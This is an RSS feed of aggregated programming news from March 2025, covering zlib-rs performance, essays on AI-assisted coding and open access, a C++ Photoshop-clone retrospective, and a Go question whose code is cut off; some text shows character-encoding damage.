<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Dev News</title><link>https://securenza.github.io/SecurityFeed/</link><description></description><item><title>Finding the Right Collaborator on GitHub</title><link>https://medium.com/@miltonhyndrex/finding-the-right-collaborator-on-github-d174d021e202</link><author>/u/Zestyclose-Poet9876</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 20:15:16 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[In the fast-paced world of software development, collaboration is key to bringing innovative ideas to life. Whether youâ€™re an open-source enthusiast or working on a private project, finding the right collaborator can make a significant difference. In this blog post, weâ€™ll explore strategies for finding the perfect collaborator on GitHub and introduce you to a handy tool l designed to streamline this process.Collaboration offers numerous benefits:: Teaming up with others brings a variety of skills to the table.: Sharing the workload helps in achieving milestones faster.: Collaborating with others allows you to learn new techniques and best practices.: Different perspectives can lead to more effective solutions.GitHubâ€™s search functionality is a powerful tool for finding potential collaborators. You can search for users based on their repositories, contributions, and skills.: Find users who have worked on projects similar to yours.: Look for users proficient in the programming languages your project requires.: Use topic tags to discover repositories and contributors with specific interests.Be an active member of the GitHub community:Participate in Discussions: Join conversations in issues and pull requests.Contribute to Open Source: Contributing to other projects can help you connect with like-minded developers.Attend Meetups and Events: GitHub hosts various events where you can meet potential collaborators.Platforms like Twitter, Reddit, and specialized forums can be great places to find collaborators. Share your project details and what youâ€™re looking for in a collaborator.Donâ€™t underestimate the power of your existing network. Let your colleagues and friends know youâ€™re looking for collaborators. They might know someone who fits the bill.To simplify the process of finding the right collaborator, we developed the . This application leverages the GitHub API to help you find potential collaborators based on specific criteria.: Quickly find users by their GitHub username.: Discover users based on their repositories, skills, or interests.: Identify users who have contributed to specific repositories.: Narrow down search results based on geographical location.: View detailed profiles including repositories, contributions, and activity.Check it out on: https://collaborator-finder-tool.onrender.com/By using this tool, you can easily find collaborators who match your projectâ€™s needs and get detailed information about their GitHub activity. If you want in on the action you can find this project on GitHub.Find Repo here: https://github.com/nia-cloud-official/collaborator-finder-tool/Finding the right collaborator on GitHub can significantly enhance your projectâ€™s development process. By leveraging GitHubâ€™s search features, engaging with the community, and utilizing tools like the Collaborator Finder Tool, you can connect with talented developers who share your vision.]]></content:encoded></item><item><title>LZAV 4.9: Increased decompression speed, resolved all msan issues, better platform detection. Fast In-Memory Data Compression Algorithm (inline C/C++) 460+MB/s compress, 2800+MB/s decompress, ratio% better than LZ4, Snappy, and Zstd@-1</title><link>https://github.com/avaneev/lzav</link><author>/u/avaneev</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 19:46:35 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Zlib-rs is faster than C</title><link>https://trifectatech.org/blog/zlib-rs-is-faster-than-c/</link><author>dochtman</author><category>dev</category><category>hn</category><pubDate>Sun, 16 Mar 2025 19:35:07 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[We've released version 0.4.2 of zlib-rs, featuring a number of substantial performance improvements. We are now (to our knowledge) the fastest api-compatible zlib implementation for decompression, and beat the competition in the most important compression cases too.We've built a dashboard that shows the performance of the current main branch compared to other implementations, and tracks our performance over time to catch any regressions and visualize our progress.This post compares zlib-rs to the latest zlib-ng and, for decompression, also to zlib-chromium. These are the leading C zlib implementations that focus on performance. We'll soon write a blog post with more technical details, and only cover the most impactful changes briefly.Last time, we benchmarked using the  flag. That gave the best results for our implementation, but was not entirely fair because our rust implementation could assume that certain SIMD capabilities would be available, while zlib-ng had to check for them at runtime.We have now made some changes so that we can efficiently select the most optimal implementation at runtime too.Picking the best version of a function is known as multiversioning. We have a baseline implementation that works on all CPUs, and then some number of specialized versions that use SIMD instructions or other features that may or may not be available on a particular CPU. The challenge is to always pick the optimal implementation, but with minimal runtime cost. That means we want to do the runtime check as few times as possible, and then perform a large chunk of work.Today, multiversioning is not natively supported in rust. There are proposals for adding it (which we're very excited about!), but for now, we have to implement it manually which unfortunately involves some unsafe code. We'll write more about this soon (for the impatient, the relevant code is here).The C code is able to use  implicit fallthroughs to generate very efficient code. Rust does not have an equivalent of this mechanism, and this really slowed us down when data comes in in small chunks.Nikita Popov suggested we try the -Cllvm-args=-enable-dfa-jump-thread option, which recovers most of the performance here. It performs a kind of jump threading for deterministic finite automata, and our decompression logic matches this pattern.LLVM does not currently enable this flag by default, but that is the plan eventually. We're also looking into supporting this optimization in rustc itself, and making it more fine-grained than just blindly applying it to a whole project and hoping for the best.As far as we know, we're the fastest api-compatible zlib implementation today for decompression. Not only do we beat zlib-ng by a fair margin, we're also faster than the implementation used in chromium.Like before, our benchmark is decompressing a compressed version of silesia-small.tar, feeding the state machine the input in power-of-2 sized chunks. Small chunk sizes simulate the streaming use case, larger chunk sizes model cases where the full input is availabe.We're now significantly faster than zlib-ng for all but the smallest chunk size. A chunk size of  bytes is very unlikely to be relevant for performance in practice because the input can just be buffered and then decompressed in larger chunks.We are however significantly faster than zlib-ng at the more relevant chunk sizes: well over 10% for inputs of 1kb, and over 6% for inputs of 65kb.For decompression, the zlib implementation used in the chromium project (found here, which we use via a modified version of ) is often faster than zlib-ng. However, we also beat it at this benchmark for the most relevant chunk sizes.Interestingly, zlib-chromium is mostly faster for the smaller chunk sizes, while for larger chunk sizes performance is fairly comparable to zlib-ng.We've been chipping away at compression too (shoutout to Brian Pane, who contributed numerous PRs in this area), but see more mixed results.On x86_64 linux, we are faster for some of the compression levels that matter most, about 6% at the default level of 6, and over 10% at the "best compression" level 9. But we're still slightly slower for most of the other levels when comparing to zlib-ng.For most users, decompression is the most relevant operation, and even for compression we're a lot faster than stock zlib. Nevertheless, we'll continue to try and improve compression performance.zlib-rs can be used both in C projects and as a rust crate in rust projects. For rust projects, we recommend using the  release of the flate2 crate with the  feature flag. For use in C projects, zlib-rs can be built as a C dynamic library (see instructions) and used in any project that uses zlib today.Our implementation is mostly done, and clearly performs extremely well. However, we're missing some less commonly used API functions related to gzip files that would make us a complete drop-in replacement in all cases.To complete the work and improve performance and e.g. packaging, we're seeking funding for the amount of â‚¬95.000. See the workplan for details.Please contact us if you are interested in financially supporting zlib-rs.]]></content:encoded></item><item><title>AI Is Making Developers Dumb</title><link>https://eli.cx/blog/ai-is-making-developers-dumb</link><author>chronicom</author><category>dev</category><category>hn</category><pubDate>Sun, 16 Mar 2025 18:51:58 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[People often talk about the productivity gains that comes from LLMs, and it would be disingenuous of me to dismiss these. Itâ€™s true. You can be productive with an LLM-assisted workflow, but that same workflow could also be making you dumber.Thereâ€™s a reason behind why I say this. Over time, you develop a reliance on LLM tools. This is to the point where is starts to become hard for you to work without one.I got into software engineering because I love building things and figuring out how stuff works. That means that I enjoy partaking in the laborious process of pressing buttons on my keyboard to form blocks of code.LLM-assisted workflows take this away. Instead of the satisfaction of figuring out a problem by hand, one simply asks the LLM to take a guess.Instead of understanding why things work in the way they do, you become dependent on an assistant to tell you what you should do.Some people might not enjoy writing their own code. If thatâ€™s the case, as harsh as it may seem, I would say that theyâ€™re trying to work in a field that isnâ€™t for them. Maybe youâ€™re just here for the money? Fair enough. That happens with every profession, and it generally shows through oneâ€™s enthusiasm and demeanor.The best engineers Iâ€™ve met are people who will spend hours at the weekend building their own version of a tool or software. Heck, thatâ€™s where you get innovation and advancements from. You canâ€™t find performance improvements without a good understanding of how a system works, otherwise youâ€™re just shooting in the dark.There is a concept called â€œCopilot Lagâ€. It refers to a state where after each action, an engineer pauses, waiting for something to prompt them what to do next. There is no self-sufficiency, just the act of waiting for an AI to tell them what should come next. Itâ€™s akin to where a junior in the field might start - relying on their more senior colleagues to guide them and understand how to proceed.Eons ago, I used to use GitHub Copilot in VS Code. When I look back on that time period now, Iâ€™m amazed I didnâ€™t do more damage to knowledge retention.Over time, I started to forget basic foundational elements of the languages I worked with. I started to forget parts of the syntax, how basic statements are used. Itâ€™s pretty embarrassing to look back and think about how I was eroding the knowledge I had gathered just because I wanted a short term speed increase.Thatâ€™s the reality of what happens when you use Copilot for a year. You start to forget things, because you are no longer having to think about what youâ€™re doing in the same way that you would when you try to figure out how to solve a problem yourself.It was actually a video by ThePrimeagen that made me realise this and confront reality. He had a clip from one of his streams where he was talking about Copilot lag. What a wake up call that was!I stopped using LLM assistants for coding after that, and Iâ€™m glad I did.To give an example, compilers are an area that I find super interesting. I had actually tried to work through Thorsten Ballâ€™s Writing An Interpreter In Go at the time. But it was completely pointless. Instead of learning about the topics and techniques in the book, Copilot was just outputting the code for me. Sure, it might feel cool that you just wrote a parser, but could you do it again if you turned Copilot off? Probably not. You also lose the chance to learn about concepts like memory management or data oriented design, because Copilot just gives you some code that it thinks might work, instead of you researching topics and understanding nuances.That actually leads into another angle. Research. This time with a more positive spin on AI.Itâ€™s true. LLMs are useful. Theyâ€™re like a search engine. We used to use stack overflow to get help with a programming problem. Since LLMs are trained on all that data, they can be effective tools to learn more about a concept. But only if you use them with an inquisitive mindset and donâ€™t trust their output.As theyâ€™re notorious for making crap up because, well, thatâ€™s how LLMs work by design, it means that theyâ€™re probably making up nonsense half the time. Itâ€™s just about patterns and token sequences, not real statements by people that are insanely knowledgeable. Itâ€™s trained on content created by people who know what theyâ€™re talking about, but it regurgitates it in a manner that differs from the source material.Anyway, interrogating responses and trying to figure out why it's recommending certain approaches is the only real way to get benefits from an LLM. Treat it like a conversation with someone, where youâ€™re trying to understand why they like a certain technique. If you donâ€™t understand why something is being suggested, or what itâ€™s actually doing under the hood, then you have failed.And make notes! Lots of them! I recently started playing around with Zig, and I constantly make notes on things that I am learning about the language, especially considering that itâ€™s my first time dealing with memory management. They can be a useful reference point and handy when youâ€™re stuck, or maybe even something to share with others!I wrote this post on my morning commute, and my Tube has arrived at its destination, so Iâ€™ll leave it here.]]></content:encoded></item><item><title>The Ultimate Git Tutorial (Git 2.48)</title><link>https://www.reddit.com/r/programming/comments/1jcslub/the_ultimate_git_tutorial_git_248/</link><author>/u/jhcarl0814</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 18:50:11 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Discovering the secrets of linux kernel</title><link>https://github.com/Gliese832B/gdp</link><author>/u/BisonUseful257</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 18:34:51 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[GDP is an attempt to create a simple network library via XDP.XDP is a kernel-level packet processor that provides super fast features.My method: I try to manipulate xdp by sending packet my own interface and then xdp will capture that. And I can receive packets in kernel level but I still did not add that to code.Why did not i use AF_XDP?eh I actually don't know. Even I am not sure about that I can use that. I just want to create my own method I do not care it is good or not. I would even be happy if someone learned about XDP because of me.I will take care any suggestion.]]></content:encoded></item><item><title>Simulating a quantum computer in 200 lines of code</title><link>https://gist.github.com/vtereshkov/b2e404cd94dc431c0b3b027c622361c7</link><author>/u/vtereshkov</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 18:34:31 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Our Interfaces Have Lost Their Senses</title><link>https://wattenberger.com/thoughts/our-interfaces-have-lost-their-senses</link><author>me_smith</author><category>dev</category><category>hn</category><pubDate>Sun, 16 Mar 2025 18:11:11 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[Think about how you experience the worldâ€”you touch, you hear, you move.An interface is the bridge between
	Computers used to be physical beasts.We programmed them by punching cards, plugging in wires, and flipping switches. Programmers walked among banks of switches and cables, physically choreographing their logic. Being on a computer used to be a full-body experience.
We've been successfully removing all friction from our apps â€” think about how effortless it is to scroll
	through a social feed. But is that what we want? Compare the feeling of doomscrolling to kneading
	dough, playing an instrument, sketching... these take effort, but they're also deeply
	satisfying. When you strip away too much friction, meaning and satisfaction go with it.
Think about how you use physical tools. Drawing isn't just moving your handâ€”it's the
	feel of the pencil against paper, the tiny adjustments of pressure, the sound of graphite
	scratching. You shift your body to reach the other side of the canvas. You erase with your other
	hand. You step back to see the whole picture.
We made painting feel like typing,Putting the you back in UISo how might our interfaces look if we shaped them to fit us?
We use our hands to sculpt, our eyes to scan, our ears to catch patterns.
	Our computers can communicate to us in many different formats, each with their own strengths:And what about the reverse! We can communicate to our computers in many different ways, each with their own strengths:
And the real magic happens when we combine different modalities. You can't read and listen and speak
	at the same timeâ€”try reading this excerpt while talking about your day:
If it had not rained on a certain May morning Valancy Stirlingâ€™s whole life would have been
		entirely different. She would have gone, with the rest of her clan, to Aunt Wellingtonâ€™s
		engagement picnic and Dr. Trent would have gone to Montreal. But it did rain and you shall hear
		what happened to her because of it.
	Let's build interfaces that let us multitask across senses.So, what might a richer interface look like? I have strong conviction that our future interfaces should:
let us collaborate on , not just ephemeral chat logs.support multiple concurrent modalitiesâ€”voice, gestures,
		visuals, spatial components.
	respond to â€”detecting context, organizing information, helping
		us think better.
	Last year, I did a rough exploration of what this could look like for a thought organizing tool. One that listened as you talked or typed, and organized your rambling thoughts into cards.
This interface is very rough, but felt like a different way of working with technology. Especially how it let me bumble through rough ideas one second, then responded to commands like "re-group my cards" or "add 3 cards about this" the next.
I would love to see more explorations like this!
Our interfaces have lost their sensesAll day, we poke, swipe, and scroll through flat, silent
	screens. But we're more than just eyes and a pointer finger. We think with our hands, our ears,
	our bodies.
The future of computing is being designed right now. Can we build something richerâ€”something that
	moves with us, speaks our language, and molds to our bodies?
]]></content:encoded></item><item><title>Complete idiot looking to transition to Rust from .NET and the Microsoft tech stack</title><link>https://www.reddit.com/r/rust/comments/1jcqzml/complete_idiot_looking_to_transition_to_rust_from/</link><author>/u/Big-Boy-Turnip</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sun, 16 Mar 2025 17:40:51 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[I've committed to starting new projects in Rust and, over time, rewriting existing code as well. So far, I'm getting somewhat comfortable with porting C console apps to Rust and using Rust in Web apps wherever it makes sense.That said, my bread and butter (as a self-employed software developer) is and always has been .NET and the Microsoft tech stack starting with C#. I make desktop apps and even in 2025 still target Windows 7 (for some projects).My clients are sometimes small government agencies, sometimes hobbyists looking to revive old equipment, and everything and everyone in between. I've written code for Windows drivers and I have a strong sense for that.I believe that Rust enables me to write better code. I'm getting to grips with new terminology and the greater Rust ecosystem, from packages and crates to handling parallelism. What I'm missing are more examples and resources.Where would I start transitioning my .NET desktop app development towards a Rust base? I don't need the code to produce native GUI elements, but I've yet to find a proper UI library for Windows that's built on Rust. Is this something I should pursue?Furthermore, it looks like there are very few Rust developers who are also mainly Windows developers, so I get the feeling I'm in a minority inside of a minority and that's OK. I'd just like to hear about others' experiences working in this space!Does Rust make sense, in your opinion, for what I'm seeking or should I give up and keep writing in C#, C/C++, and .NET? Thank you!]]></content:encoded></item><item><title>One giant Kubernetes cluster for everything</title><link>https://blog.frankel.ch/one-giant-kubernetes-cluster/</link><author>/u/nfrankel</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sun, 16 Mar 2025 17:37:03 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>&quot;Wait, not like that&quot;: Free and open access in the age of generative AI</title><link>https://www.citationneeded.news/free-and-open-access-in-the-age-of-generative-ai/</link><author>thinkingemote</author><category>dev</category><category>hn</category><pubDate>Sun, 16 Mar 2025 17:23:33 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[Listen to me read this post here (not an AI-generated voice!), subscribe to the feed in your podcast app, or download the recording for later.The visions of the open access movement have inspired countless people to contribute their work to the commons: a world where â€œevery single human being can freely share in the sum of all knowledgeâ€ (Wikimedia), and where â€œeducation, culture, and science are equitably shared as a means to benefit humanityâ€ (Creative Commons).But there are scenarios that can introduce doubt for those who contribute to free and open projects like the Wikimedia projects, or who independently release their own works under free licenses. I call these â€œwait, no, not like thatâ€ moments.When a passionate Wikipedian discovers their carefully researched article has been packaged into an e-book and sold on Amazon for someone elseâ€™s profit? .When a developer of an open source software project sees a multi-billion dollar tech company rely on their work without contributing anything back? When a nature photographer discovers their freely licensed wildlife photo was used in an NFT collection minted on an environmentally destructive blockchain? .And perhaps most recently, when a person who publishes their work under a free license discovers that work has been used by tech mega-giants to train extractive, exploitative large language models? These reactions are understandable. When we freely license our work, we do so in service of those goals: free and open access to knowledge and education. But when trillion dollar companies exploit that openness while giving nothing back, or when our work enables harmful or exploitative uses, it can feel like we've been naÃ¯ve. The natural response is to try to regain control.This is where many creators find themselves today, particularly in response to AI training. But the solutions they're reaching for â€” more restrictive licenses, paywalls, or not publishing at all â€” risk destroying the very commons they originally set out to build. is an independent publication, entirely supported by readers like you. Consider signing up for a free or pay-what-you-want subscription â€” it really helps me to keep doing this work.The first impulse is often to try to tighten the licensing, maybe by switching away to something like the Creative Commonsâ€™ non-commercial (and thus, non-free) license. When NFTs enjoyed a moment of popularity in the early 2020s, some artists looked to Creative Commons in hopes that they might declare NFTs fundamentally incompatible with their free licenses (they didnâ€™t). The same thing happened again with the explosion of generative AI companies training models on CC-licensed works, and some were disappointed to see the group take the stance that, not only do CC licenses not prohibit AI training wholesale, AI training should be considered non-infringing by default from a copyright perspective.But the trouble with trying to continually narrow the definitions of â€œfreeâ€ is that it is impossible to write a license that will perfectly prohibit each possibility that makes a person go â€œwait, no, not like thatâ€ while retaining the benefits of free and open access. If that is truly what a creator wants, then they are likely better served by a traditional, all rights reserved model in which any prospective reuser must individually negotiate terms with them; but this undermines the purpose of free, and restricts permitted reuse only to those with the time, means, and bargaining power to negotiate on a case by case basis.Particularly with AI, thereâ€™s also no indication that tightening the license even . We already know that major AI companies have been training their models on all rights reserved works in their ongoing efforts to ingest as much data as possible. Such training may prove to have been permissible in US courts under fair use, and itâ€™s probably best that it does.Thereâ€™s also been an impulse by creators concerned about AI to dramatically limit how people can access their work. Some artists have decided itâ€™s simply not worthwhile to maintain an online gallery of their work when that makes it easily accessible for AI training. Many have implemented restrictive content gates â€” paywalls, registration-walls, â€œare you a humanâ€-walls, and similar â€” to try to fend off scrapers. This too closes off the commons, making it more challenging or expensive for those â€œevery single human beingsâ€ described in open access manifestos to access the material that was originally intended to be common goods.Often by trying to wall off those considered to be bad actors, people wall off the very people they intended to give access to. People who gate their work behind paywalls likely didnâ€™t set out to create works that only the wealthy could access. People who implement registration walls probably didnâ€™t intend for their work to only be available to those willing to put up with the risk of incessant email spam after they relinquish their personal information. People who try to stave off bots with CAPTCHAs asking â€œare you a human?â€ probably didnâ€™t mean to limit their material only to abled people who are willing to abide ever more protracted and irritating riddles. And people using any of these strategies likely didnâ€™t want people to struggle to even find their work in the first place after the paywalls and regwalls and anti-bot mechanisms thwarted search engine indexers or social media previews.And frankly, if we want to create a world in which every single human being can freely share in the sum of all knowledge, and where education, culture, and science are equitably shared as a means to benefit humanity, we should stop attempting to erect these walls. If a kid learns that carbon dioxide traps heat in Earth's atmosphere or how to calculate compound interest thanks to an editorâ€™s work on a Wikipedia article, does it really matter if they learned it via ChatGPT or by asking Siri or from opening a browser and visiting Wikipedia.org?Instead of worrying about â€œwait, not like thatâ€, I think we need to reframe the conversation to â€œwait, not  like thatâ€ or â€œwait, not in ways that threaten open access itselfâ€. The true threat from AI models training on open access material is not that more people may access knowledge thanks to new modalities. Itâ€™s that those models may stifle Wikipedia and other free knowledge repositories, benefiting from the labor, money, and care that goes into supporting them while also bleeding them dry. Itâ€™s that trillion dollar companies become the sole arbiters of access to knowledge after subsuming the painstaking work of those who made knowledge free to all, killing those projects in the process.Irresponsible AI companies are already imposing huge loads on Wikimedia infrastructure, which is costly both from a pure bandwidth perspective, but also because it requires dedicated engineers to maintain and improve systems to handle the massive automated traffic. And AIÂ companies that do not attribute their responses or otherwise provide any pointers back to Wikipedia prevent users from knowing where that material came from, and do not encourage those users to go visit Wikipedia, where they might then sign up as an editor, or donate after seeing a request for support. (This is most AI companies, by the way. Many AI â€œvisionariesâ€ seem perfectly content to promise that artificial superintelligence is just around the corner, but claim that attribution is somehow a permanently unsolvable problem.)And while I rely on Wikipedia as an example here, the same goes for any website containing freely licensed material, where scraping benefits AI companies at often extreme cost to the content hosts. This isn't just about strain on one individual project, it's about the systematic dismantling of the infrastructure that makes open knowledge possible.Anyone at an AI company who stops to think for half a second should be able to recognize they have a vampiric relationship with the commons. While they rely on these repositories for their sustenance, their adversarial and disrespectful relationships with creators reduce the incentives for anyone to make their work publicly available going forward (freely licensed or otherwise). They drain resources from maintainers of those common repositories often without any compensation. They reduce the visibility of the original sources, leaving people unaware that they can or should contribute towards maintaining such valuable projects. AI companies should want a thriving open access ecosystem, ensuring that the models they trained on Wikipedia in 2020 can be continually expanded and updated. Even if AI companies donâ€™t care about the benefit to the common good, it shouldnâ€™t be hard for them to understand that by bleeding these projects dry, they are destroying their own food supply.And yet many AI companies seem to give very little thought to this, seemingly looking only at the months in front of them rather than operating on years-long timescales. (Though perhaps anyone who has observed AI companiesâ€™ activities more generally will be unsurprised to see that they do not act as though they believe their businesses will be sustainable on the order of years.)It would be very wise for these companies to immediately begin prioritizing the ongoing health of the commons, so that they do not wind up strangling their golden goose. It would also be very wise for the rest of us to not rely on AI companies to suddenly, miraculously come to their senses or develop a conscience en masse.Instead, we must ensure that mechanisms are in place to  AI companies to engage with these repositories on their creators' terms.There are ways to do it: models like Wikimedia Enterprise, which welcomes AI companies to use Wikimedia-hosted data, but requires them to do so using paid, high-volume pipes to ensure that they do not clog up the system for everyone else and to make them financially support the extra load theyâ€™re placing on the projectâ€™s infrastructure. Creative Commons is experimenting with the idea of â€œpreference signalsâ€ â€” a non-copyright-based model by which to communicate to AI companies and other entities the terms on which they may or may not reuse CC licensed work. Everyday people need to be given the tools â€” both legal and technical â€” to enforce their own preferences around how their works are used.Some might argue that if AI companies are already ignoring copyright and training on all-rights-reserved works, they'll simply ignore these mechanisms too. But there's a crucial difference: rather than relying on murky copyright claims or threatening to expand copyright in ways that would ultimately harm creators, we can establish clear legal frameworks around consent and compensation that build on existing labor and contract law. Just as unions have successfully negotiated terms of use, ethical engagement, and fair compensation in the past, collective bargaining can help establish enforceable agreements between AI companies, those freely licensing their works, and communities maintaining open knowledge repositories. These agreements would cover not just financial compensation for infrastructure costs, but also requirements around attribution, ethical use, and reinvestment in the commons.The future of free and open access isn't about saying â€œwait, not like thatâ€ â€” itâ€™s about saying "yes, like that, but under fair termsâ€. With fair compensation for infrastructure costs. With attribution and avenues by which new people can discover and give back to the underlying commons. With deep respect for the communities that make the commons â€” and the tools that build off them â€”Â possible. Only then can we truly build that world where every single human being can freely share in the sum of all knowledge.As I was writing this piece, I discovered that a SXSW panel featuring delegates from the Wikimedia Foundation and Creative Commons, titled â€œOpenness Under Pressure: Navigating the Future of Open Accessâ€, discussed some of the same topics. (I was, sadly, scheduled to speak at the same time and so was unable to attend in person). The audio recording is available online, and I would highly recommend giving it a listen if this is a topic that interests you!]]></content:encoded></item><item><title>LACT v0.7.2 released with RDNA4 support, Nvidia locked clocks and ROP count reporting</title><link>https://github.com/ilya-zlobintsev/LACT/releases/tag/v0.7.2</link><author>/u/Interject_</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 17:22:16 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Dev Recreates Photoshop in C++</title><link>https://f055.net/technology/that-time-i/that-time-i-recreated-photoshop-in-c/</link><author>/u/HimothyJohnDoe</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 17:05:35 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[As Iâ€™m getting older I look back on all the things Iâ€™ve done as a creative developer, and I see so many cool projects! But I never wrote down any development stories, and most of these projects, even as successful when released, got lost in time as years go by. Thatâ€™s why Iâ€™m starting my new posts series â€žThat time Iâ€ where I look back on my most interesting projects.The first one is about that time I recreated Photoshop in C++ and Windows API! I invite you to read my story and leave a comment with feedback, itâ€™s hard to go on without your input ðŸ™‚Everything started in early summer of 2006. I was reading *a lot* of manga back then. But all the image reading apps sucked. Specifically, none of the apps allowed me to control my reading using just the mouse, and reaching my keyboard all the time was distracting. Since I just finished the C++/Windows API course at the uni, I spent the summer break coding my perfect manga reader. And I named it Fiew.Early autumn 2006 we returned to uni and had to decide on our final thesis for the degree. Writing the image viewer went smooth enough that I got the idea I could create an image editor as well. I was a heavy Adobe Photoshop user back then, so that became my goal. I mean, how hard can it be? Turns out, very.Over the course of the next several months, I wrote Advanced Image Editor named Fedit in C++ using Windows API and GDI+ graphic libraries. It followed a set of five rules to benefit the end user: no installers, no archives, no registry keys, no additional runtimes and a single executable file. The result was a program that was ready to work without the need of installation, could be run on systems with limited privileges (or straight from a thumb drive) and consumed small amounts of resources.I was very careful to make the interface look like classic Photoshop, and include all my most used features. So you had all the free floating windows with tools. The excellent colour picker. Easy layer management. Step-by-step reversible history. Several image filters, plus a matrix interface to encode your own pixel shifting filters too.Straight from my previous project named Fiew I added a massive image library viewer. It really could quickly and easily scroll through massive amounts of pictures.I had a lot of fun coding Fedit. And a lot of issues along the way. I spent a ton of time on MSDN and Stack Overflow, however that didnâ€™t help that much since most of the issues were so specific I had to analyse and debug them on my own. But I worked like crazy on it, my motivation was immense. I had to make the bachelor thesis deadline, so for the final two-month stint I worked 14 hours a day.User interface was the most tricky bit. I wanted the workflow to resemble Photoshop as much as possible. The freely snapping-unsnapping of the tool settings pane was particularly hard. But no less than recreating the colour picker or the tool selector.By the time I finished I was pretty exhausted and kind of resenting WinAPI. But the thesis was a success and I received my Bachelor of Science in Engineering from the Warsaw University of Technology. Fedit received several positive reviews online but I didnâ€™t promote it. Instead I took a well deserved holiday. A few months later thanks to the impression Fiew and Fedit made on the CTO of GoldenLine (Polish LinkedIn, market leader in its time, but now defunct), I landed a C++ job with a task to create extremely efficient WinAPI app to handle massive image uploading for a clone of Flickr. So in the end all that effort paid off.Fedit (and Fiew) source code is available on GitHub. The thesis documentation is available as PDF. The original website for these apps is still up on the Web Archive!]]></content:encoded></item><item><title>tk9.0: v0.65.0 adds support for many more image formats</title><link>https://www.reddit.com/r/golang/comments/1jcpp3d/tk90_v0650_adds_support_for_many_more_image/</link><author>/u/0xjnml</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sun, 16 Mar 2025 16:45:28 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[   submitted by    /u/0xjnml ]]></content:encoded></item><item><title>MCP-server written in GO</title><link>https://www.reddit.com/r/golang/comments/1jcp06c/mcpserver_written_in_go/</link><author>/u/Temporary-Funny-1630</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sun, 16 Mar 2025 16:14:59 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Hey everyone! Iâ€™d love to share my project with you:ðŸš€  â€“ a powerful  for AI agents!-  for AI agent interactions - Supports multiple databases: PostgreSQL, MySQL, ClickHouse, Oracle, and more - Flexible modular architecture with plugins:â­ Give it a star and come contribute! ðŸ”— Repo: GitHub]]></content:encoded></item><item><title>Go is DOOMed</title><link>https://gitlab.com/cznic/doomgeneric/-/raw/master/sshot.png</link><author>/u/0xjnml</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sun, 16 Mar 2025 15:45:55 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>How the hell do I make this Go program faster?</title><link>https://www.reddit.com/r/golang/comments/1jcnqfi/how_the_hell_do_i_make_this_go_program_faster/</link><author>/u/yourpwnguy</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sun, 16 Mar 2025 15:18:31 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[So, Iâ€™ve been messing around with a Go program that: Writes the sorted output to a new fileSeems so straightforward man :( Except itâ€™s slow as hell. Hereâ€™s my code: import ( "fmt" "os" "strings" "slices" )func main() { if len(os.Args) < 2 { fmt.Fprintln(os.Stderr, "Usage:", os.Args[0], "<file.txt>") return }// Read the input file f, err := os.ReadFile(os.Args[1]) if err != nil { fmt.Fprintln(os.Stderr, "Error reading file:", err) return } // Process the file lines := strings.Split(string(f), "\n") uniqueMap := make(map[string]bool, len(lines)) var trimmed string for _, line := range lines { if trimmed = strings.TrimSpace(line); trimmed != "" { uniqueMap[trimmed] = true } }// Convert map keys to slice ss := make([]string, len(uniqueMap)) i := 0 for key := range uniqueMap { ss[i] = key i++ } slices.Sort(ss) // Write to output file o, err := os.Create("out.txt") if err != nil { fmt.Fprintln(os.Stderr, "Error creating file:", err) return } defer o.Close() o.WriteString(strings.Join(ss, "\n") 